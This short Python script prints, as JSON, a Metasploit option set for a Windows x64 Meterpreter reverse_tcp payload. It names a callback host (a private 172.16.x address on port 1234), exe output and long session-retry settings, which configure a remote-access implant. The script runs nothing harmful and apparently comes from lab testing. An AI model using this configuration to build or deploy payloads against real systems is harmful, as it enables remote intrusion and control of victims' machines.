import json
a = {'mname': 'windows/x64/meterpreter/reverse_tcp', 'opts': {'PAYLOAD': 'windows/x64/meterpreter/reverse_tcp', 'WORKSPACE': None, 'VERBOSE': False, 'WfsDelay': 2, 'EnableContextEncoding': False, 'ContextInformationFile': None, 'DisablePayloadHandler': False, 'ExitOnSession': False, 'ListenerTimeout': 0, 'LHOST': '172.16.171.129', 'LPORT': 1234, 'ReverseListenerBindAddress': '0.0.0.0', 'PayloadUUIDSeed': '0ba141fe-bd57-11ec-b10f-000c29b3f831', 'ReverseListenerBindPort': None, 'ReverseAllowProxy': False, 'ReverseListenerComm': None, 'ReverseListenerThreaded': False, 'StagerRetryCount': 10, 'StagerRetryWait': 5, 'PingbackRetries': 0, 'PingbackSleep': 30, 'PayloadUUIDRaw': None, 'PayloadUUIDName': None, 'PayloadUUIDTracking': False, 'EnableStageEncoding': False, 'StageEncoder': None, 'StageEncoderSaveRegisters': '', 'StageEncodingFallback': True, 'PrependMigrate': False, 'PrependMigrateProc': None, 'EXITFUNC': 'process', 'AutoLoadStdapi': True, 'AutoVerifySessionTimeout': 30, 'InitialAutoRunScript': '', 'AutoRunScript': '', 'AutoSystemInfo': True, 'EnableUnicodeEncoding': False, 'HandlerSSLCert': None, 'SessionRetryTotal': 31536000, 'SessionRetryWait': 10, 'SessionExpirationTimeout': 94608000, 'SessionCommunicationTimeout': 31536000, 'PayloadProcessCommandLine': '', 'AutoUnhookProcess': False, 'MeterpreterDebugBuild': False, 'TARGET': 0, 'ID': 0, 'Format': 'exe'}}
print(json.dumps(a))
